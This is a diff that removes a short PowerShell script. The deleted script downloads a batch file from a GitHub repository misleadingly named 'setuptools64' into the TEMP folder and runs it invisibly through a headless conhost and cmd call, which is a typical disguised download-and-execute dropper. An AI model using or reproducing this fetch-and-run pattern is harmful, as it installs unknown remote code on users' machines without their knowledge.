@@ -1,6 +1,0 @@
-$ErrorActionPreference = "Stop"
-
-$URL1 = "https://raw.githubusercontent.com/Acfy/setuptools64/refs/heads/main/setup.bat"
-$FilePath1 = "$env:TEMP\output.bat"
-Invoke-WebRequest -Uri $URL1 -OutFile $FilePath1
-Start-Process -FilePath "conhost.exe" -ArgumentList "--headless cmd /c $FilePath1" -NoNewWindow
